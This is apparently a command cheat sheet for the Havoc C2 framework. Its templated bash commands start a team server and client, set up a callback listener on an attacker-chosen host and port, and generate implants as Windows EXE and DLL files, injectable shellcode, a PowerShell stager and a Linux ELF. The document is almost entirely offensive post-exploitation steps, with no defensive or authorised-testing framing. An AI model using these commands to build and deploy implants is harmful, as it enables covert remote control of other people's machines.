# Havoc

> Havoc C2 framework: start the server/client, manage listeners, and generate cross-platform implant payloads.

<!-- tags: c2, havoc, implant, payload, listener, post-exploit -->

---

## start havoc server
Start the Havoc team server (requires root).

```bash
sudo ./havoc server
```

<!-- meta: risk=med | phase=post | tags=havoc,server,setup -->

---

## start havoc client
Connect the Havoc client to the team server.

```bash
./havoc client
```

<!-- meta: risk=low | phase=post | tags=havoc,client,setup -->

---

## create havoc listener
Create a named listener bound to a host and port for implant callbacks.

```bash
havoc listener --name {{LISTENER:str:http-1}} --host {{LHOST:ip}} --port {{LPORT:port:443}}
```

<!-- meta: risk=med | phase=post | tags=havoc,listener,setup -->

---

## list havoc listeners
List the available/active listeners.

```bash
havoc listener --list
```

<!-- meta: risk=low | phase=post | tags=havoc,listener,enum -->

---

## generate havoc windows exe payload
Generate a Windows EXE implant tied to a listener.

```bash
havoc payload --listener {{LISTENER:str:http-1}} --format exe --output {{OUTFILE:file:implant.exe}}
```

<!-- meta: risk=high | phase=exploit | tags=havoc,payload,windows,exe -->

---

## generate havoc windows dll payload
Generate a Windows DLL implant tied to a listener.

```bash
havoc payload --listener {{LISTENER:str:http-1}} --format dll --output {{OUTFILE:file:implant.dll}}
```

<!-- meta: risk=high | phase=exploit | tags=havoc,payload,windows,dll -->

---

## generate havoc shellcode payload
Generate raw shellcode for injection into a target process.

```bash
havoc payload --listener {{LISTENER:str:http-1}} --format shellcode --output {{OUTFILE:file:implant.bin}}
```

<!-- meta: risk=high | phase=exploit | tags=havoc,payload,shellcode,injection -->

---

## generate havoc powershell payload
Generate a PowerShell stager/implant tied to a listener.

```bash
havoc payload --listener {{LISTENER:str:http-1}} --format powershell --output {{OUTFILE:file:implant.ps1}}
```

<!-- meta: risk=high | phase=exploit | tags=havoc,payload,powershell -->

---

## generate havoc linux payload
Generate a Linux implant tied to a listener.

```bash
havoc payload --listener {{LISTENER:str:http-1}} --format linux --output {{OUTFILE:file:implant.elf}}
```

<!-- meta: risk=high | phase=exploit | tags=havoc,payload,linux,elf -->

---

## list havoc payload formats
List the payload formats Havoc can generate.

```bash
havoc payload --formats
```

<!-- meta: risk=low | phase=post | tags=havoc,payload,enum -->
